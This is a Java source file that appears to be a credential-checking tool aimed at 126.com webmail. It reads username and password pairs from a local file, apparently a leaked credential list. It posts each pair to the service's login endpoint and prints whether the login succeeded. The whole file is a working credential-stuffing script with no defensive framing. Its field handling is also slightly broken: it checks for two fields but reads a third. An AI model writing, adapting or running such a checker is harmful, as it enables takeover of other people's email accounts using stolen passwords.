package com.tristan.jje;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.UnsupportedEncodingException;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.HashSet;
import java.util.List;
import java.util.Map;
import java.util.Set;

import org.apache.http.Header;
import org.apache.http.HttpResponse;
import org.apache.http.NameValuePair;
import org.apache.http.client.ClientProtocolException;
import org.apache.http.client.HttpClient;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.message.BasicNameValuePair;
import org.apache.http.protocol.HTTP;

public class EmailVerify126 {
public static void main(String[] args) throws Exception {
	
	
	FileInputStream fis = new FileInputStream(new File("D:/jinjiang/tristan/126.txt"));
	InputStreamReader isr = new InputStreamReader(fis);
	BufferedReader br = new BufferedReader(isr);
	
	String temp = "";
	
	while ((temp = br.readLine()) != null) {
		String[] s =temp.split(",");
		if(s.length>=2){
			String username = s[2];
			String password = s[1].substring(1, s[1].length()-1);
			verify(username, password);
		}
		
	}
	
}

private static void verify(String username, String password) throws UnsupportedEncodingException, IOException, ClientProtocolException {
	String url = "https://mail.126.com/entry/cgi/ntesdoor?df=mail126_letter&from=web&funcid=loginone&iframe=1&language=-1&passtype=1&product=mail126&verifycookie=-1&net=failed&style=-1&race=-2_-2_-2_db&uid="+username+"&hid=10010102";
	HttpPost httpost = new HttpPost(url);
	HttpClient httpclient = new DefaultHttpClient();

	List<NameValuePair> nvps = new ArrayList <NameValuePair>();  
    nvps.add(new BasicNameValuePair("username",username));  
    nvps.add(new BasicNameValuePair("password",password));  
    httpost.setEntity(new UrlEncodedFormEntity(nvps, HTTP.UTF_8));
    
	HttpResponse response = httpclient.execute(httpost);
	Header[] hs = response.getHeaders("x-ntes-mailentry-result");
	System.out.println(username +","+ password +","+hs[0].getValue());
}
}
